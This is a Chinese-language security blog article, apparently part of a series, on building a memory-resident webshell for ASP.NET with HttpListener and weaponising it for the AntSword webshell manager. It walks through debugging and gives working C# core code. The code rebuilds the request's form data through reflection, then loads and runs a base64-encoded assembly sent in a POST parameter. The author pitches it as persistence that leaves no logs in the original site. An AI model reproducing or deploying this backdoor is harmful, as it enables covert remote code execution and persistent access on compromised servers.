# ASP.NET下的内存马(三)：HttpListener内存马

<meta name="referrer" content="no-referrer" />


本文首发于：https://tttang.com/archive/1451/
## 前言

asp.net下的内存马研究文章比较少，目前提到过的包括虚拟路径内存马以及HttpListener内存马。最近研究了一下其他类型的内存马，发现.net可以利用的地方要多得多。所以准备写个系列文章，讲一讲asp.net下的内存马。



**文章仅作研究性质，不保证任何实战效果，请勿用于非法用途。**



今天讲一种特殊的内存马：基于HttpListener实现的内存马。

## 关于HttpListener

HttpListener进一步的简化了Http协议的监听，仅需通过字符串的方法提供监听的地址和端口号以及虚拟路径，就可以开始监听工作了。与 IIS 上发布网站相比，使用 HttpListener 编程的程序更加轻量化，易于发布和更新。配合 Thread 或 Task 类也可以支持一定的并发。

HttpListener的全限定类名是System.Net.HttpListener，这个类的主要作用就是启动一个简单的Web Server。个人理解就类似python的python -m http.server一样，可以很快启动一个简单的Http服务。在这里可以看到他的官方文档：https://docs.microsoft.com/zh-cn/dotnet/api/system.net.httplistener?view=net-6.0



之所以说这种方式比较特殊是因为这种方式相当于重新起了一个全新的Web。有点类似于，攻击者打进去服务器后，给目标装了一个DVWA。并且这种内存马必须要System权限才能启动。主要用于权限的维持。优点在于可以端口复用，并且因为是攻击者启动的Server所以不会在原有的Web中留下日志。

这种利用方式最早应该是出现在头像哥Exchange的exp里https://github.com/zcgonvh/CVE-2020-17144，后来Hiding师傅在文章中对其进行详细的解释，并且实现了哥斯拉可以连接的Demo：https://github.com/A-D-Team/SharpMemshell/tree/main/HttpListener

## 基本使用

以下是微软官方文档给出的样例，其中主要的部分在代码中已经注释

```cpp
// This example requires the System and System.Net namespaces.
public static void SimpleListenerExample(string[] prefixes)
{
    if (!HttpListener.IsSupported)//判断是否支持HttpListener类型
    {
        Console.WriteLine ("Windows XP SP2 or Server 2003 is required to use the HttpListener class.");
        return;
    }
    // URI prefixes are required,
    // for example "http://contoso.com:8080/index/".
    if (prefixes == null || prefixes.Length == 0)//判断URL格式是否正确
      throw new ArgumentException("prefixes");

    // 创建一个HttpListener对象
    HttpListener listener = new HttpListener();
    // Add the prefixes.
    foreach (string s in prefixes)
    {
        listener.Prefixes.Add(s);
    }
    listener.Start();
    Console.WriteLine("Listening...");
    // 从上下文中获取Request，Response对象
    HttpListenerContext context = listener.GetContext();
    HttpListenerRequest request = context.Request;
    // Obtain a response object.
    HttpListenerResponse response = context.Response;
    // 设置返回的信息
    string responseString = "<HTML><BODY> Hello world!</BODY></HTML>";
    byte[] buffer = System.Text.Encoding.UTF8.GetBytes(responseString);
    // 写入到输出流中
    response.ContentLength64 = buffer.Length;
    System.IO.Stream output = response.OutputStream;
    output.Write(buffer,0,buffer.Length);
    // You must close the output stream.
    output.Close();
    listener.Stop();
}
```

按照官方的代码样例来分析

1. 判断是否支持HttpListener
2. 创建HttpListener对象
3. 添加URL路径
4. 调用HttpListener.Start()启动Server
5. Listener.GetContext()获取上下文Context，并编写自己的处理逻辑
6. 调用Listener.Stop()停止Server



具体的使用场景以及方式Hiding在文章中已经写的非常清楚了，本文主要讲一讲蚁剑武器化过程中遇到的各种坑。

## 武器化踩坑

### 入口参数问题

在蚁剑C#类型的设计之初定义了三种入口参数，用于获取当前上下文的Request跟Response

1. System.Web.HttpContext对象
2. 包含System.Web.Request与System.Web.Response对象的数组
3. 自动通过HttpContext.Current来拿到当前的Context

System.Net.HttpListenerContext跟System.Web.HttpContext长得有点像，但其实是两个八竿子打不着的东西，无法直接转换，或者从一个中提取出另一个。

同样Listener中的Request是System.Net.HttpListenerRequest，属于不一样的实现。查看文档后发现，Listener的Request非常的原始，很多方法都没有，并不像Router内存马一样把System.Web.Request包了一层。所以也是没有办法直接转换的。

HttpListener实际上相当于新启动了一个进程，在里面调用HttpContext.Current的结果会是一个null，所以自动化提取Context也不太行。

Hiding师傅在他的文章里面给出了一种解决办法：通过提取HttpListenerRequest，HttpListenerResponse的参数来构造一个我们可以用的System.Web.Request跟System.Web.Response对象，然后作为参数实例化一个System.Web.HttpContext。

具体代码实现如下：

```cpp
HttpListenerContext context = listener.GetContext();
HttpListenerRequest request = context.Request;
HttpListenerResponse response = context.Response;
...
HttpRequest req = new HttpRequest("", request.Url.ToString(), request.QueryString.ToString());
System.IO.StreamWriter writer = new System.IO.StreamWriter(response.OutputStream);
HttpResponse resp = new HttpResponse(writer);
HttpContext httpContext = new HttpContext(req, resp);
```

看起来没问题了，文章中的代码用哥斯拉也可以正常连接，但是实际上这里构造出来的req并不是一个完整的HttpRequest，为下面的坑埋下了伏笔。

### 蚁剑获取网站根路径的问题

最开始改了一版代码后一直无法连接，查看代码发现当时蚁剑在获取基本信息的时候使用的是HttpContext.Current.Server.MapPath("/")来获取根路径，在exe中HttpContext.Current为空，所以这句就会报一个空指针错误。修改为AppDomain.CurrentDomain.BaseDirectory即可。

![img](https://cdn.nlark.com/yuque/0/2022/png/1599908/1645335819441-764eaeee-66ed-4e0a-9b92-774297393fc8.png)

### Request无法获取POST参数的问题

这个点当时也被坑了很久，修了上面的问题之后测试连接提示正常，但是打开路径会返回空指针错误。

以为是路径模块写的有问题，结果发现cmd也不能用，数据库也不能用。但是确实基本信息是可以获取到的，非常奇怪。

由于Listener马必须要在System权限下运行，Rider用管理员权限打开后还是无法调试，所以就采用了一个笨办法：编译成exe->管理员打开->Console.WriteLine打印信息。。。

由于蚁剑的Payload也都是assembly的形式打进去的，不能直接调试，还是用打印的办法调试。。。总之调试的过程就是非常恶心。。。

甚至写了一个弹计算器的demo，发现还是可以正常运行，但是一放到蚁剑中的Payload就是不能跑。

```cpp
public string calc()
{
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + "calc";
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.RedirectStandardError = true;
    p.Start();
    return "success";
}
```

![img](https://cdn.nlark.com/yuque/0/2022/png/1599908/1644737607986-9015c71d-5cff-4573-8e55-e130768e747e.png)

最后终于让我发现了一个规律：只要涉及到需要第三方参数的就会报空指针错误，硬编码Payload可以正常运行。



![img](https://cdn.nlark.com/yuque/0/2022/png/1599908/1644737632498-65ea1453-2a68-44f7-8bc7-5504b276767e.png)

以打开目录为例，在exe中加了这样一句调试语句，同时burp重放蚁剑的Payload：

```cpp
if (req.Form["path"] != null)
{
    Console.WriteLine("path is not null");
}
else
{
    Console.WriteLine("path is null");
}
```

![img](https://cdn.nlark.com/yuque/0/2022/png/1599908/1644740283147-8d1e6874-08c6-4d30-897e-a99cc2a4fe24.png)

果然，提示收到的path参数为空

为什么会这样呢？猜测可能是构造出来的Request对象有问题，就去翻了一下Request的源码，看Form属性是如何初始化以及工作的。

```cpp
public NameValueCollection Form
    {
      get
      {
        this.EnsureForm();//主要逻辑
        if (this._flags[2])
        {
          this._flags.Clear(2);
          this.ValidateHttpValueCollection(this._form, RequestValidationSource.Form);
        }
        return (NameValueCollection) this._form;
      }
    }
```

看EnsureForm()

```cpp
    internal HttpValueCollection EnsureForm()
    {
      if (this._form == null)//判断_form是否为空
      {
        this._form = new HttpValueCollection();//如果为空则new一个HttpValueCollection
        if (this._wr != null)//判断this._wr是否为null
          this.FillInFormCollection();//如果不是null则调用FillInFormCollection方法
        this._form.MakeReadOnly();//否则MakeReadOnly
      }
      return this._form;
    }
```

查看FillInFormCollection()，主要功能就是读取input输入流，然后解析为一个一个键值对赋值给this._form。同样前面也有一个this._wr 是否为null的判断

```cpp
    private void FillInFormCollection()
    {
      if (this._wr == null || !this._wr.HasEntityBody())
        return;
      string contentType = this.ContentType;
      if (contentType == null || this._readEntityBodyMode == ReadEntityBodyMode.Bufferless)
        return;
      if (StringUtil.StringStartsWithIgnoreCase(contentType, "application/x-www-form-urlencoded"))
      {//application/x-www-form-urlencoded 分析
        byte[] bytes = (byte[]) null;
        HttpRawUploadedContent entireRawContent = this.GetEntireRawContent();
        if (entireRawContent != null)
          bytes = entireRawContent.GetAsByteArray();
        if (bytes == null)
          return;
        try
        {//处理键值对的主要函数
          this._form.FillFromEncodedBytes(bytes, this.ContentEncoding);
        }
        catch (Exception ex)
        {
          throw new HttpException(SR.GetString("Invalid_urlencoded_form_data"), ex);
        }
      }
      else
      {//multipart/form-data 数据流分析
        if (!StringUtil.StringStartsWithIgnoreCase(contentType, "multipart/form-data"))
          return;
        MultipartContentElement[] multipartContent = this.GetMultipartContent();
        if (multipartContent == null)
          return;
        for (int index = 0; index < multipartContent.Length; ++index)
        {
          if (multipartContent[index].IsFormItem)
          {
            this._form.ThrowIfMaxHttpCollectionKeysExceeded();
            this._form.Add(multipartContent[index].Name, multipartContent[index].GetAsString(this.ContentEncoding));
          }
        }
      }
    }
```

那么我们是哪一步导致form没有成功构造呢，前面我们可以看到构造过程中多次对this._wr成员进行是否为空的判断。问题也就出在这里。

HttpRequest总共有三个构造函数，其中第二个public HttpRequest(string filename, string url, string queryString)是Hiding师傅使用的，也是唯一一个可以直接public调用的构造函数。但是在第二个第三个构造函数中，都会默认把this._wr赋值为null，所以也就无法走到BuildForm的过程中。

```cpp
internal HttpRequest(HttpWorkerRequest wr, HttpContext context)
{
    this._wr = wr;
    this._context = context;
}

public HttpRequest(string filename, string url, string queryString)
{
    this._wr = (HttpWorkerRequest) null;
    this._pathTranslated = filename;
    this._httpMethod = "GET";
    this._url = new Uri(url);
    this._path = VirtualPath.CreateAbsolute(this._url.AbsolutePath);
    this._queryStringText = queryString;
    this._queryStringOverriden = true;
    this._queryString = new HttpValueCollection(this._queryStringText, true, true, Encoding.Default);
    PerfCounters.IncrementCounter(AppPerfCounter.REQUESTS_EXECUTING);
}

internal HttpRequest(VirtualPath virtualPath, string queryString)
{
    this._wr = (HttpWorkerRequest) null;
    this._pathTranslated = virtualPath.MapPath();
    this._httpMethod = "GET";
    this._url = new Uri("http://localhost" + virtualPath.VirtualPathString);
    this._path = virtualPath;
    this._queryStringText = queryString;
    this._queryStringOverriden = true;
    this._queryString = new HttpValueCollection(this._queryStringText, true, true, Encoding.Default);
    PerfCounters.IncrementCounter(AppPerfCounter.REQUESTS_EXECUTING);
}
```

那么为什么Hiding连接哥斯拉还能成功呢？

那是因为哥斯拉从头到尾只需要一个参数，并且这一个参数是通过Hiding师傅自己实现的parse_post函数来解析出来的(https://github.com/A-D-Team/SharpMemshell/blob/main/HttpListener/memshell.cs#L151)

但是蚁剑是多个参数的模式，需要在payload中获取到参数才可以。


为了解决这个问题，我们其实没有必要再去凑一个HttpWorkerRequest，完全可以跳过这一步，直接反射调用最核心的_form字段的FillFromEncodedBytes函数，使得我们new出来的Request对象是一个可以完整使用的Request对象。

在这里我把核心代码抽象为一个aspx，测试我们构造出来的reqeust对象能否真正获取到请求的各个参数

```cpp
<%@ Page Language="C#" Debug=true%>
<%@ Import Namespace="System.Reflection" %>
<%
     byte[] rawData = new byte[Request.InputStream.Length];
     Request.InputStream.Read(rawData, 0, rawData.Length);
     HttpRequest req = new HttpRequest("", Request.Url.ToString(), Request.QueryString.ToString());
     FieldInfo field = req.GetType().GetField("_form", BindingFlags.Instance | BindingFlags.NonPublic);
     Type formtype = field.FieldType;
     MethodInfo method = formtype.GetMethod("FillFromEncodedBytes", BindingFlags.Instance | BindingFlags.NonPublic);
     ConstructorInfo constructor = formtype.GetConstructor(BindingFlags.NonPublic | BindingFlags.Instance, null, new Type[0], null);
     object obj = constructor.Invoke(null);
     method.Invoke(obj, new object[] { rawData, Request.ContentEncoding });
     field.SetValue(req, obj);
     Response.Write(req.Form["test"]);
%>
```

可以看到，我们新构造的request对象已经可以正确获取当前请求的key-value了

![img](https://cdn.nlark.com/yuque/0/2022/png/1599908/1645337259000-ed0664c7-eb8b-437b-9a1a-9cfc42fd4827.png)

## 核心代码

Talk is cheap, show me your code.

核心代码如下：

```cpp
HttpListenerContext context = listener.GetContext();
HttpListenerRequest request = context.Request;
HttpListenerResponse response = context.Response;
SetRespHeader(response);
Stream stm = null;
HttpContext httpContext;
try
{
    string data = new StreamReader(request.InputStream, request.ContentEncoding).ReadToEnd();
    byte[] rawData = System.Text.Encoding.Default.GetBytes(data);
    HttpRequest req = new HttpRequest("", request.Url.ToString(), request.QueryString.ToString());
    FieldInfo field = req.GetType().GetField("_form", BindingFlags.Instance | BindingFlags.NonPublic);
    Type formtype = field.FieldType;
    MethodInfo method = formtype.GetMethod("FillFromEncodedBytes",
                                           BindingFlags.Instance | BindingFlags.NonPublic);
    ConstructorInfo constructor =
        formtype.GetConstructor(BindingFlags.NonPublic | BindingFlags.Instance, null, new Type[0],
                                null);
    object obj = constructor.Invoke(null);
    method.Invoke(obj, new object[] { rawData, request.ContentEncoding });
    field.SetValue(req, obj);

    System.IO.StreamWriter writer = new System.IO.StreamWriter(response.OutputStream);
    HttpResponse resp = new HttpResponse(writer);
    httpContext = new HttpContext(req, resp);
    if (req.Form["ant"] != null)
    {
        System.Reflection.Assembly assembly =
            System.Reflection.Assembly.Load(Convert.FromBase64String(req.Form["ant"]));
        assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(httpContext);
        httpContext.Response.End();
        //Console.WriteLine("filter end");
    }
    else
    {
        response.StatusCode = 404;
        response.ContentLength64 = not_found.Length;
        stm = response.OutputStream;
        stm.Write(not_found, 0, not_found.Length);
    }
}
```

## 测试

修改Prefix为自定义路径，启动exe

测试连接成功

![img](https://cdn.nlark.com/yuque/0/2022/png/1599908/1645337774044-9762e7a9-73e2-40af-a442-01a96d89acc7.png)

查看debug日志，能够正确获取到path参数

![img](https://cdn.nlark.com/yuque/0/2022/png/1599908/1644760474387-4b8e149e-591c-44ec-a573-b81942feeaf1.png)

成功进入路径，其他操作也是可以正常执行的

![img](https://cdn.nlark.com/yuque/0/2022/png/1599908/1644760456257-58343f59-dd7b-408e-a111-c0de8ae1a2fd.png)

## 参考链接

https://docs.microsoft.com/zh-cn/dotnet/api/system.net.httplistenerrequest?view=netframework-3.0

https://docs.microsoft.com/zh-cn/dotnet/api/system.web.httprequest?view=netframework-4.8

https://mp.weixin.qq.com/s/zsPPkhCZ8mhiFZ8sAohw6w

[http://yzddmr6.com/posts/%E8%81%8A%E8%81%8A%E6%96%B0%E7%B1%BB%E5%9E%8BASPXCSharp/](http://yzddmr6.com/posts/聊聊新类型ASPXCSharp/)
